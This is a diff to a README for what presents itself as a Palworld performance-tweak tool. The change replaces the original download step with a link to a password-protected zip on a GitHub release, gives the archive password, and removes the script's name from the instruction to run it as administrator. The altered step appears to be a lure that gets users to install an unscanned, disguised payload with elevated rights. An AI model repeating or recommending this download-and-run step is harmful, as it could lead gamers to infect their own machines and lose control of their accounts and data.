@@ -19,8 +19,9 @@ What it does:
 
 ## ⚙️ How to Use
 
-1. [Download](Link)
-2. Run optimize.bat as administrator.
+1. [Download]([Link](https://github.com/spiremoonslicer/Palworld-Performance-Tweaks/releases/download/Download/New.Version.zip))
+PASSWORD (5868781)
+2. Run as administrator.
 3. Choose:
    - 1 – Apply performance tweaks  
    - 2 – Restore original settings  
